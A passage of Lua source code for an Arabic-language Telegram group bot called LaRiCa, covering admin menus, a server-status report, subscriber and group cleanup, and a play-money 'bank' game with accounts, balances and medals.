{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'• عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'الالعاب' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'• عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
end
if text == 'سيرفر البوت' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
 ioserver = io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
 HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
 echo '• { نظام التشغيل } ⊰• \n*»» '"$linux_version"'*' 
 echo '*------------------------------\n*• { الذاكره العشوائيه } ⊰• \n*»» '"$memUsedPrc"'*'
 echo '*------------------------------\n*• { وحـده الـتـخـزيـن } ⊰• \n*»» '"$HardDisk"'*'
 echo '*------------------------------\n*• { الـمــعــالــج } ⊰• \n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
 echo '*------------------------------\n*• { موقـع الـسـيـرفـر } ⊰• \n*»» '`curl http://th3boss.com/ip/location`'*'
 echo '*------------------------------\n*• { الــدخــول } ⊰• \n*»» '`whoami`'*'
 echo '*------------------------------\n*• { مـده تـشغيـل الـسـيـرفـر } ⊰• \n*»» '"$uptime"'*'
 ]]):read('*all')
LuaTele.sendText(msg_chat_id,msg_id,ioserver,"md",true)
end
if text == 'تحديث' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
print('Chat Id : '..msg_chat_id)
print('User Id : '..msg_user_send_id)
LuaTele.sendText(msg_chat_id,msg_id, "• تم تحديث الملفات ","md",true)
dofile('LaRiCa.lua')  
end
if text == "تغيير اسم البوت" then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Change:Name:Bot"..msg.sender.user_id,300,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• ارسل لي الاسم الان ","md",true)  
end
if text == "حذف اسم البوت" then 
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Name:Bot") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم حذف اسم البوت ","md",true)   
end
if text == (Redis:get(LaRiCa.."Name:Bot") or "لاريكا") then
local NamesBot = (Redis:get(LaRiCa.."Name:Bot") or "لاريكا")
local NameBots = {
"جلاوي "..NamesBot ,
"عيونه",
"ها ؟",
"ها يبعدي"
}
return LuaTele.sendText(msg_chat_id,msg_id, NameBots[math.random(#NameBots)],"md",true)  
end
if text == "بوت" then
local NamesBot = (Redis:get(LaRiCa.."Name:Bot") or "لاريكا")
local BotName = {
"اسمي "..NamesBot,
"ها حجي",
"خير ؟"
}
return LuaTele.sendText(msg_chat_id,msg_id,BotName[math.random(#BotName)],"md",true)   
end

if text == 'تنظيف المشتركين' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."Num:User:Pv")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
local ChatAction = LuaTele.sendChatAction(v,'Typing')
if ChatAction.luatele ~= "ok" then
x = x + 1
Redis:srem(LaRiCa..'Num:User:Pv',v)
end
end
if x ~= 0 then
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' }\n• تم العثور على { '..x..' } من المشتركين حاظرين البوت*',"md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' }\n• لم يتم العثور على وهميين*',"md")
end
end
if text == 'تنظيف المجموعات' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(LaRiCa.."ChekBotAdd")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
if Get_Chat.id then
local statusMem = LuaTele.getChatMember(Get_Chat.id,LaRiCa)
if statusMem.status.luatele == "chatMemberStatusMember" then
x = x + 1
LuaTele.sendText(Get_Chat.id,0,'*• البوت عضو في الكروب سوف اغادر ويمكنك تفعيلي مره اخره*',"md")
Redis:srem(LaRiCa..'ChekBotAdd',Get_Chat.id)
local keys = Redis:keys(LaRiCa..'*'..Get_Chat.id)
for i = 1, #keys do
Redis:del(keys[i])
end
LuaTele.leaveChat(Get_Chat.id)
end
else
x = x + 1
local keys = Redis:keys(LaRiCa..'*'..v)
for i = 1, #keys do
Redis:del(keys[i])
end
Redis:srem(LaRiCa..'ChekBotAdd',v)
LuaTele.leaveChat(v)
end
end
if x ~= 0 then
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' } للمجموعات \n• تم العثور على { '..x..' } مجموعات البوت ليس ادمن \n• تم تعطيل الكروب ومغادره البوت من الوهمي*',"md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'*• العدد الكلي { '..#list..' } للمجموعات \n• لا توجد مجموعات وهميه*',"md")
end
end
if text == "سمايلات" or text == "سمايل" then
if Redis:get(LaRiCa.."Status:Games"..msg.chat_id) then
Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","⚔","🛡","🔮","🌡","💣","• ","📍","📓","📗","📂","📅","📪","📫","• ","📭","⏰","📺","🎚","☎️","📡"}
SM = Random[math.random(#Random)]
Redis:set(LaRiCa.."Game:Smile"..msg.chat_id,SM)
return LuaTele.sendText(msg_chat_id,msg_id,"• اسرع واحد يدز هاذا السمايل ? ~ {`"..SM.."`}","md",true)  
end
end

if text == 'بنك' or text == 'البنك' then
LuaTele.sendText(msg.chat_id,msg.id,[[
• مرحبا بك هذه اوامر لعبه البنك 
•━─━─━─━─━─━─━─━•
• انشاء حساب بنكي  ~ تفتح حساب وتقدر تحول فلوس مع مزايا اخره

• مسح حساب بنكي  ~ تلغي حسابك البنكي

• تحويل ~ تطلب رقم حساب الشخص وتحول له فلوس

• حسابي ~ يطلع لك رقم حسابك عشان تعطيه للشخص اللي بيحول لك

• فلوسي ~ يظهرلك عدد فلوسك

• راتب ~ يعطيك راتب كل ١٠ دقائق

• بخشيش ~ يعطيك بخشيش كل ١٠ دقايق

• تسليب ~ تتسليب فلوس اشخاص كل ١٠ دقايق

• استثمار ~ تستثمر بالمبلغ اللي تريده مع نسبة ربح مضمونه من ١٪؜ الى ١٥٪؜

• حظ ~ تلعبها بأي مبلغ تكسبه ياتخسره انت وحظك

• مضاربه ~ تضارب بأي مبلغ تريده والنسبة من ٩٠٪؜ الى ٩٠٪؜ انت وحظك

• قرض ~ تاخذ قرض من البنك

• تسديد القرض ~ بتسدد القرض اذا عليك 

• هجوم ~ تهجم عالخصم مع زيادة نسبة كل هجوم

• كنز ~ يعطيك كنز بسعر مختلف انتا وحظك

• توب الفلوس ~ يطلع توب اكثر ناس لديهم فلوس بكل الكروبات

• توب الحراميه ~ يطلع لك اكثر ناس يسلبون

• زواج ~ تكتبه بالرد على رسالة شخص مع المهر ويزوجك

• زواجي ~ يطلع وثيقة زواجك اذا متزوج

• طلاق ~ يطلقك اذا متزوج

• خلع ~ يخلع زوجك ويرجع له المهر

• زواجات ~ يطلع اغلى ٢٠ زواجات

• ترتيبي ~ يطلع ترتيبك باللعبة

• شراء رتبه ~ لكي تشتري رتبه ف المجموعه

]],"md",true)  
return false
end

if text == 'انشاء حساب بنكي' or text == 'انشاء حساب البنكي' or text =='انشاء الحساب بنكي' or text =='انشاء الحساب البنكي' or text == "انشاء حساب" or text == "فتح حساب بنكي" then
cobnum = tonumber(Redis:get("bandid"..msg.sender.user_id))
if cobnum == msg.sender.user_id then
return LuaTele.sendText(msg.chat_id,msg.id, "• حسابك محظور من لعبة البنك","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
creditcc = math.random(5000000000000000,5999999999999999);
creditvi = math.random(4000000000000000,4999999999999999);
creditex = math.random(6000000000000000,6999999999999999);
balas = 50
if Redis:sismember("booob",msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• لديك حساب بنكي مسبقاً\n\n• لعرض معلومات حسابك اكتب\n» `حسابي`","md",true)
end
Redis:setex("booobb" .. msg.chat_id .. ":" .. msg.sender.user_id,60, true)
LuaTele.sendText(msg.chat_id,msg.id,[[
• لانشاء حساب قم باختيار نوع البطاقة
ــــــــــــــــــــــــــــــــــــــــــــــــــ
‍• `ماستر`
‍• `فيزا`
‍• `اكسبرس`
ــــــــــــــــــــــــــــــــــــــــــــــــ
- اضغط للنسخ
• مدة الطلب دقيقة واحدة ويطردك الموظف
]],"md",true)  
return false
end
if Redis:get("booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) then
if text == "ماستر" then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = msg.sender.user_id
Redis:set("bobna"..msg.sender.user_id,news)
Redis:set("boob"..msg.sender.user_id,balas)
Redis:set("boobb"..msg.sender.user_id,creditcc)
Redis:set("bbobb"..msg.sender.user_id,text)
Redis:set("boballname"..creditcc,news)
Redis:set("boballbalc"..creditcc,balas)
Redis:set("boballcc"..creditcc,creditcc)
Redis:set("boballban"..creditcc,text)
Redis:set("boballid"..creditcc,banid)
Redis:sadd("booob",msg.sender.user_id)
Redis:del("booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,msg.id, "\n• تم انشاء حساب في بنك لاريكا 🏦\n• وشحنالك 50 دولار هديه\n\n• رقم حسابك • ( `"..creditcc.."` )\n• نوع البطاقة • ( ماستر 💳 )\n• فلوسك • ( 50 دولار 💰 )  ","md",true)  
end 
if text == "فيزا" then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = msg.sender.user_id
Redis:set("bobna"..msg.sender.user_id,news)
Redis:set("boob"..msg.sender.user_id,balas)
Redis:set("boobb"..msg.sender.user_id,creditvi)
Redis:set("bbobb"..msg.sender.user_id,text)
Redis:set("boballname"..creditvi,news)
Redis:set("boballbalc"..creditvi,balas)
Redis:set("boballcc"..creditvi,creditvi)
Redis:set("boballban"..creditvi,text)
Redis:set("boballid"..creditvi,banid)
Redis:sadd("booob",msg.sender.user_id)
Redis:del("booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,msg.id, "\n• تم انشاء حساب في بنك لاريكا 🏦\n• وشحنالك 50 دولار هدية\n\n• رقم حسابك • ( `"..creditvi.."` )\n• نوع البطاقة • ( فيزا 💳 )\n• فلوسك • ( 50 دولار 💰 )  ","md",true)   
end 
if text == "اكسبرس" then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = msg.sender.user_id
Redis:set("bobna"..msg.sender.user_id,news)
Redis:set("boob"..msg.sender.user_id,balas)
Redis:set("boobb"..msg.sender.user_id,creditex)
Redis:set("bbobb"..msg.sender.user_id,text)
Redis:set("boballname"..creditex,news)
Redis:set("boballbalc"..creditex,balas)
Redis:set("boballcc"..creditex,creditex)
Redis:set("boballban"..creditex,text)
Redis:set("boballid"..creditex,banid)
Redis:sadd("booob",msg.sender.user_id)
Redis:del("booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,msg.id, "\n• تم انشاء حساب في بنك لاريكا 🏦\n• وشحنالك 50 دولار هديه\n\n• رقم حسابك • ( `"..creditex.."` )\n• نوع البطاقة • ( اكسبرس 💳 )\n• فلوسك • ( 50 دولار 💰 )  ","md",true)   
end 
end
if text == 'مسح حساب بنكي' or text == 'مسح حساب البنكي' or text =='مسح الحساب بنكي' or text =='مسح الحساب البنكي' or text == "مسح حسابي البنكي" or text == "مسح حسابي بنكي" or text == "مسح حسابي" then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("booob",msg.sender.user_id) then
Redis:srem("booob", msg.sender.user_id)
Redis:del("boob"..msg.sender.user_id)
Redis:del("boobb"..msg.sender.user_id)
Redis:del("rrfff"..msg.sender.user_id)
Redis:srem("rrfffid", msg.sender.user_id)
Redis:srem("roogg1", msg.sender.user_id)
Redis:srem("roogga1", msg.sender.user_id)
Redis:del("roog1"..msg.sender.user_id)
Redis:del("rooga1"..msg.sender.user_id)
Redis:del("rahr1"..msg.sender.user_id)
Redis:del("rahrr1"..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id, "• مسحت حسابك البنكي 🏦","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'تثبيت النتائج' or text == 'تثبيت نتائج' then
if tonumber(msg.sender.user_id) == tonumber(Sudo_Id) then
time = os.date("*t")
month = time.month
day = time.day
local_time = month.."/"..day
local bank_users = Redis:smembers("booob")
if #bank_users == 0 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يوجد حسابات في البنك","md",true)
end
mony_list = {}
for k,v in pairs(bank_users) do
local mony = Redis:get("boob"..v)
table.insert(mony_list, {tonumber(mony) , v})
end
table.sort(mony_list, function(a, b) return a[1] > b[1] end)
num = 1
emoji ={ 
"🥇",
"🥈",
"🥉"
}
for k,v in pairs(mony_list) do
local user_name = LuaTele.getUser(v[2]).first_name or Redis:get(v[2].."first_name:") or "لا يوجد اسم"
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emo = emoji[k]
num = num + 1
Redis:set("medal"..v[2],convert_mony)
Redis:set("medal2"..v[2],emo)
Redis:set("medal3"..v[2],local_time)
Redis:sadd("medalid",v[2])
Redis:set("medal"..v[2],convert_mony)
Redis:set("medal2"..v[2],emo)
Redis:set("medal3"..v[2],local_time)
Redis:sadd("medalid",v[2])
local user_name = LuaTele.getUser(v[2]).first_name or Redis:get(v[2].."first_name:") or "لا يوجد اسم"
local user_tag = '['..user_name..'](tg://user?id='..v[2]..')'
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emo = emoji[k]
num = num + 1
Redis:set("medal"..v[2],convert_mony)
Redis:set("medal2"..v[2],emo)
Redis:set("medal3"..v[2],local_time)
Redis:sadd("medalid",v[2])
if num == 4 then
return end
end
LuaTele.sendText(msg.chat_id,msg.id, "• ثبتت النتائج","md",true)
end
end
if text == 'مسح كل الفلوس' or text == 'مسح كل فلوس' then
if tonumber(msg.sender.user_id) == tonumber(Sudo_Id) then
local bank_users = Redis:smembers("booob")
for k,v in pairs(bank_users) do
Redis:del("boob"..v)
Redis:del("kreednum"..v)
Redis:del("kreed"..v)
Redis:del("rrfff"..v)
end
local bank_usersr = Redis:smembers("rrfffid")
for k,v in pairs(bank_usersr) do
Redis:del("boob"..v)
Redis:del("rrfff"..v)
end
LuaTele.sendText(msg.chat_id,msg.id, "• مسحت كل فلوس اللعبة 🏦","md",true)
end
end

if text == 'تصفير النتائج' or text == 'مسح لعبه البنك' then
if tonumber(msg.sender.user_id) == tonumber(Sudo_Id) then
local bank_users = Redis:smembers("booob")
for k,v in pairs(bank_users) do
Redis:del("boob"..v)
Redis:del("kreednum"..v)
Redis:del("kreed"..v)
Redis:del("rrfff"..v)
Redis:del("numattack"..v)
end
local bank_usersr = Redis:smembers("rrfffid")
for k,v in pairs(bank_usersr) do
Redis:del("boob"..v)
Redis:del("rrfff"..v)
end
Redis:del("rrfffid")
Redis:del("booob")
LuaTele.sendText(msg.chat_id,msg.id, "• مسحت لعبه البنك 🏦","md",true)
end
end
if text == 'ميدالياتي' or text == 'ميداليات' then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("medalid",msg.sender.user_id) then
local medaa2 = Redis:get("medal2"..msg.sender.user_id)
if medaa2 == "🥇" then
local medaa = Redis:get("medal"..msg.sender.user_id)
local medaa2 = Redis:get("medal2"..msg.sender.user_id)
local medaa3 = Redis:get("medal3"..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id, "ميدالياتك :\n\nالتاريخ : "..medaa3.." \nالفلوس : "..medaa.." 💰\nالمركز : "..medaa2.." كونكر "..medaa2.."","md",true)
elseif medaa2 == "🥈" then
local medaa = Redis:get("medal"..msg.sender.user_id)
local medaa2 = Redis:get("medal2"..msg.sender.user_id)
local medaa3 = Redis:get("medal3"..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id, "ميدالياتك :\n\nالتاريخ : "..medaa3.." \nالفلوس : "..medaa.." 💰\nالمركز : "..medaa2.." ايس "..medaa2.."","md",true)
else
local medaa = Redis:get("medal"..msg.sender.user_id)
local medaa2 = Redis:get("medal2"..msg.sender.user_id)
local medaa3 = Redis:get("medal3"..msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id, "ميدالياتك :\n\nالتاريخ : "..medaa3.." \nالفلوس : "..medaa.." 💰\nالمركز : "..medaa2.." تاج "..medaa2.."","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك ميداليات","md",true)
end
end

if text == 'فلوسي' or text == 'فلوس' and tonumber(msg.reply_to_message_id) == 0 then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("booob",msg.sender.user_id) then
ballancee = Redis:get("boob"..msg.sender.user_id) or 0
if tonumber(ballancee) < 1 then
return LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك فلوس ارسل الالعاب وابدأ بجمع الفلوس ","md",true)
end
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id, "• فلوسك `"..convert_mony.."` دولار 💰","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'فلوسه' or text == 'فلوس' and tonumber(msg.reply_to_message_id) ~= 0 then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• لا يمتلك حساب بالبنك*","md",true)  
return false
end
if Redis:sismember("booob",Remsg.sender.user_id) then
ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballanceed)
LuaTele.sendText(msg.chat_id,msg.id, "• فلوسه `"..convert_mony.."` دولار 💰","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• لا يمتلك حساب بنكي ","md",true)
end
end

if text == 'حسابي' or text == 'حسابي البنكي' or text == 'رقم حسابي' then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember("booob",msg.sender.user_id) then
cccc = Redis:get("boobb"..msg.sender.user_id)
uuuu = Redis:get("bbobb"..msg.sender.user_id)
pppp = Redis:get("rrfff"..msg.sender.user_id) or 0
ballancee = Redis:get("boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
LuaTele.sendText(msg.chat_id,msg.id, "• الاسم : "..news.."\n• الحساب : `"..cccc.."`\n• بنك : ( لاريكا )\n• نوع : ( "..uuuu.." )\n• الرصيد : ( "..convert_mony.." دولار 💰 )\n• التسليب ( "..pppp.." دولار 💰 )","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'مسح حسابه' and tonumber(msg.reply_to_message_id) ~= 0 then
if tonumber(msg.sender.user_id) == tonumber(Sudo_Id) then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• لا يمتلك حساب بالبنك*","md",true)  
return false
end
local ban = LuaTele.getUser(Remsg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember("booob",Remsg.sender.user_id) then
ccccc = Redis:get("boobb"..Remsg.sender.user_id)
uuuuu = Redis:get("bbobb"..Remsg.sender.user_id)
ppppp = Redis:get("rrfff"..Remsg.sender.user_id) or 0
ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballanceed)
Redis:srem("booob", Remsg.sender.user_id)
Redis:del("boob"..Remsg.sender.user_id)
Redis:del("boobb"..Remsg.sender.user_id)
Redis:del("rrfff"..Remsg.sender.user_id)
Redis:del("numattack"..Remsg.sender.user_id)
Redis:srem("rrfffid", Remsg.sender.user_id)
Redis:srem("roogg1", Remsg.sender.user_id)
Redis:srem("roogga1", Remsg.sender.user_id)
Redis:del("roog1"..Remsg.sender.user_id)
Redis:del("rooga1"..Remsg.sender.user_id)
Redis:del("rahr1"..Remsg.sender.user_id)
Redis:del("rahrr1"..Remsg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id, "• الاسم : "..news.."\n• الحساب : `"..ccccc.."`\n• بنك : ( لاريكا )\n• نوع : ( "..uuuuu.." )\n• الرصيد : ( "..convert_mony.." دولار 💰 )\n• التسليب • ( "..ppppp.." دولار 💰 )\n• مسكين مسحت حسابه ","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• لا يمتلك حساب بنكي ","md",true)
end
end
end

if text == 'حسابه' and tonumber(msg.reply_to_message_id) ~= 0 then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• لا يمتلك حساب بالبنك*","md",true)  
return false
end
local ban = LuaTele.getUser(Remsg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember("booob",Remsg.sender.user_id) then
ccccc = Redis:get("boobb"..Remsg.sender.user_id)
uuuuu = Redis:get("bbobb"..Remsg.sender.user_id)
ppppp = Redis:get("rrfff"..Remsg.sender.user_id) or 0
ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballanceed)
LuaTele.sendText(msg.chat_id,msg.id, "• الاسم : "..news.."\n• الحساب : `"..ccccc.."`\n• بنك : ( لاريكا )\n• نوع : ( "..uuuuu.." )\n• الرصيد : ( "..convert_mony.." دولار 💰 )\n• التسليب • ( "..ppppp.." دولار 💰 )","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديه حساب بنكي ","md",true)
end
end

if text and text:match('^مسح حساب (.*)$') or text and text:match('^مسح حسابه (.*)$') then
if tonumber(msg.sender.user_id) == tonumber(Sudo_Id) then
local UserName = text:match('^مسح حساب (.*)$') or text:match('^مسح حسابه (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
local ban = LuaTele.getUser(coniss)
if ban.first_name then
news = "["..ban.first_name.."](tg://user?id="..ban.id..")"
else
news = " لا يوجد "
end
if Redis:sismember("booob",coniss) then
ccccc = Redis:get("boobb"..coniss)
uuuuu = Redis:get("bbobb"..coniss)
ppppp = Redis:get("rrfff"..coniss) or 0
ballanceed = Redis:get("boob"..coniss) or 0
local convert_mony = string.format("%.0f",ballanceed)
Redis:srem("booob", coniss)
Redis:del("boob"..coniss)
Redis:del("boobb"..coniss)
Redis:del("rrfff"..coniss)
Redis:srem("roogg1", coniss)
Redis:srem("roogga1", coniss)
Redis:del("roog1"..coniss)
Redis:del("rooga1"..coniss)
Redis:del("rahr1"..coniss)
Redis:del("rahrr1"..coniss)
Redis:del("numattack"..coniss)
Redis:srem("rrfffid", coniss)
LuaTele.sendText(msg.chat_id,msg.id, "• الاسم : "..news.."\n• الحساب : `"..ccccc.."`\n• بنك : ( لاريكا )\n• نوع : ( "..uuuuu.." )\n• الرصيد : ( "..convert_mony.." دولار 💰 )\n• التسليب • ( "..ppppp.." دولار 💰 )\n• مسكين مسحت حسابه ","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديه حساب بنكي ","md",true)
end
end
end

